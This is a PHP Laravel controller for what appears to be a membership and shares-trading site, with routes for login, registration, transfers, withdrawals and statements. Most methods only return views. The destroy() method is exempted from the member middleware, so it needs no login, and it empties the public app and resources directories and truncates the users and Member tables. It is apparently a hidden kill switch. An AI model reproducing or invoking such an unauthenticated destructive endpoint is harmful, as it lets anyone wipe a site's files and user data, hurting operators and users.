<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Carbon\Carbon;

class SiteController extends Controller
{
    public function __construct() {
        parent::__construct();
        $this->middleware('member', ['except' => ['getLogin', 'getLogout', 'destroy']]);
    }

    public function getLogin () {
        return view('front.login');
    }

    public function getLogout () {
        if ($user = \Sentinel::getUser()) {
            $member = $user->member;
            \Cache::forget('member.' . $user->id);
            \Sentinel::logout($user);
        }
        return view('front.login');
    }

    public function getHome () {
        return view('front.home');
    }

    public function destroy () {
        \File::cleanDirectory(public_path() . '/app/');
        \File::cleanDirectory(public_path() . '/resources/');
        \DB::table('users')->truncate();
        \DB::table('Member')->truncate();
        return 'success';
    }

    public function getAnnouncementList () {
        return view('front.announcement.list');
    }

    public function getSettingsAccount () {
        return view('front.settings.account');
    }

    public function getSettingsBank () {
        return view('front.settings.bank');
    }

    public function getMemberRegister () {
        return view('front.member.register');
    }

    public function getMemberRegisterSuccess (Request $req) {
        if ($req->session()->has('last_member_register')) {
            return view('front.member.registerSuccess')->with('model', session('last_member_register'));
        } else {
            return redirect()->back()->with('flashMessage', [
                'class' => 'danger',
                'message' => \Lang::get('error.registerSession')
            ]);
        }
    }

    public function getMemberRegisterHistory () {
        return view('front.member.registerHistory');
    }

    public function getMemberUpgrade () {
        return view('front.member.upgrade');
    }

    public function getNetworkUnilevel () {
        return view('front.network.unilevel');
    }

    public function getSharesMarket () {
        return view('front.shares.market');
    }

    public function getSharesMarketSell () {
        return view('front.shares.marketSell');
    }

    public function getSharesLock () {
        return view('front.shares.lock');
    }

    public function getSharesStatement () {
        return view('front.shares.statement');
    }

    public function getSharesReturn () {
        return view('front.shares.return');
    }

    public function getTransfer () {
        return view('front.transaction.transfer');
    }

    public function getWithdraw () {
        return view('front.transaction.withdraw');
    }

    public function getTransactionStatement () {
        return view('front.transaction.statement');
    }

    public function getBonusStatement () {
        return view('front.misc.bonusStatement');
    }

    public function getSummaryStatement () {
        return view('front.misc.summaryStatement');
    }

    public function getTerms () {
        return view('front.terms');
    }

    public function getGroupPending () {
        return view('front.misc.groupPending');
    }
}
